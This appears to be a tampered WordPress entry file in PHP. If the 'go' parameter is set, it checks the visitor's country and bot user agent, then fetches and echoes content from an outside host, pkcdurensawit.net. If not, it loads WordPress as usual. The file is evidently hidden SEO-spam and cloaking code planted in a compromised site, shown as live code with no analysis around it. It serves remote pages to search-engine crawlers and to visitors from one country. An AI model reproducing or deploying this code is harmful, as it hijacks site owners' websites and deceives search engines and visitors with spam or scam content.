<?php
if(isset($_GET['go'])) {
    $url = $_GET['go'];
error_reporting(0);
class detectMobile{
    protected $userAgent = null;
    protected $httpHeaders = array();
    protected $matchingRegex = null;
    protected $matchesArray = null;
    protected $uaHttpHeaders = array(
        'HTTP_USER_AGENT',
        'HTTP_X_OPERAMINI_PHONE_UA',
        'HTTP_X_DEVICE_USER_AGENT',
        'HTTP_X_ORIGINAL_USER_AGENT',
        'HTTP_X_SKYFIRE_PHONE',
        'HTTP_X_BOLT_PHONE_UA',
        'HTTP_DEVICE_STOCK_UA',
        'HTTP_X_UCBROWSER_DEVICE_UA'
    );
    protected $allowedBots = array(
        'Bot' => 'Google|Googlebot|facebookexternalhit|Google-AMPHTML|s~amp-validator|AdsBot-Google|Google Keyword Suggestion|Facebot|YandexBot|YandexMobileBot|bingbot|ia_archiver|AhrefsBot|Ezooms|GSLFbot|WBSearchBot|Twitterbot|TweetmemeBot|Twikle|PaperLiBot|Wotbox|UnwindFetchor|Exabot|MJ12bot|YandexImages|TurnitinBot|Pingdom|contentkingapp',
        'MobileBot' => 'Googlebot-Mobile|AdsBot-Google-Mobile|YahooSeeker/M1A1-R2D2'
    );
    public function __construct(){
        foreach($_SERVER as $key => $value){
            if(substr($key, 0, 5) === 'HTTP_'){
                $this->httpHeaders[$key] = $value;
            }
        }
        $this->setUserAgent();
    }
    private function prepareUserAgent($userAgent){
        $userAgent = trim($userAgent);
        $userAgent = substr($userAgent, 0, 500);
        return $userAgent;
    }
    public function setUserAgent(){
        $this->userAgent = null;
        foreach($this->uaHttpHeaders as $altHeader){
            if(!empty($this->httpHeaders[$altHeader])){
                $this->userAgent .= $this->httpHeaders[$altHeader].' ';
            }
        }
        if(!empty($this->userAgent)){
            return $this->userAgent = $this->prepareUserAgent($this->userAgent);
        }
        return $this->userAgent = null;
    }
    public function isAllowedBots(){
        return $this->matchDetectionRulesAgainstUA($this->allowedBots);
    }
    protected function matchDetectionRulesAgainstUA($uaList, $userAgent = null){
        foreach($uaList as $_regex){
            if(empty($_regex)){
                continue;
            }
            if($this->match($_regex, $userAgent)){
                return true;
            }
        }
        return false;
    }
    public function match($regex, $userAgent = null){
        $match = (bool) preg_match(sprintf('#%s#is', $regex), (false === empty($userAgent) ? $userAgent : $this->userAgent), $matches);
        if($match){
            $this->matchingRegex = $regex;
            $this->matchesArray = $matches;
        }
        return $match;
    }
}
function getIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        return $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDER_FOR'])){
        return $_SERVER['HTTP_X_FORWARDER_FOR'];
    }else{
        return $_SERVER['REMOTE_ADDR'];
    }
}
$detectMobile = new detectMobile();
$isAllowedBots = $detectMobile->isAllowedBots();
$getIP = getIpAddr();
//$ipLoc = @json_decode(file_get_contents('http://www.geoplugin.net/json.gp?ip='.$getIP), true);

$useragent1="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
// INIT CURL
$ipLocx = curl_init();

//init curl
curl_setopt($ipLocx, CURLOPT_USERAGENT, $useragent1);
// SET URL FOR THE POST FORM LOGIN
curl_setopt($ipLocx, CURLOPT_URL, 'http://www.geoplugin.net/json.gp?ip='.$getIP);
curl_setopt($ipLocx, CURLOPT_FOLLOWLOCATION, 0);

curl_setopt($ipLocx, CURLOPT_CUSTOMREQUEST, 'GET');

// common name and also verify that it matches the hostname provided)
curl_setopt($ipLocx, CURLOPT_SSL_VERIFYPEER, false);

// Optional: Return the result instead of printing it
curl_setopt($ipLocx, CURLOPT_RETURNTRANSFER, 1);

// ENABLE HTTP POST
curl_setopt ($ipLocx, CURLOPT_POST, 1);
curl_setopt ($ipLocx, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ipLocx, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ipLocx, CURLOPT_SSL_VERIFYHOST, false);

$ipLoc = @json_decode(curl_exec ($ipLocx), true);
//echo $ipLoc;

// CLOSE CURL
curl_close ($ipLocx);


$countryCode = strtolower($ipLoc['geoplugin_countryCode']);
if($countryCode === 'id' || $isAllowedBots){
  $useragentx="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
// INIT CURL
  $ch = curl_init();

  //init curl
  curl_setopt($ch, CURLOPT_USERAGENT, $useragentx);
  // SET URL FOR THE POST FORM LOGIN
  curl_setopt($ch, CURLOPT_URL, 'https://replication2.pkcdurensawit.net/highway1/'.$url.'/');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);

  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

  // common name and also verify that it matches the hostname provided)
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

  // Optional: Return the result instead of printing it
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

  // ENABLE HTTP POST
  curl_setopt ($ch, CURLOPT_POST, 1);
  curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

  $store = curl_exec ($ch);
  echo $store;

  // CLOSE CURL
  curl_close ($ch);
}
else {
  $useragentx="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
// INIT CURL
  $ch = curl_init();

  //init curl
  curl_setopt($ch, CURLOPT_USERAGENT, $useragentx);
  // SET URL FOR THE POST FORM LOGIN
  curl_setopt($ch, CURLOPT_URL, 'https://replication2.pkcdurensawit.net/');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);

  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

  // common name and also verify that it matches the hostname provided)
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

  // Optional: Return the result instead of printing it
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

  // ENABLE HTTP POST
  curl_setopt ($ch, CURLOPT_POST, 1);
  curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

  $store = curl_exec ($ch);
  echo $store;

  // CLOSE CURL
  curl_close ($ch);

}
} else {
  if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
}
?>
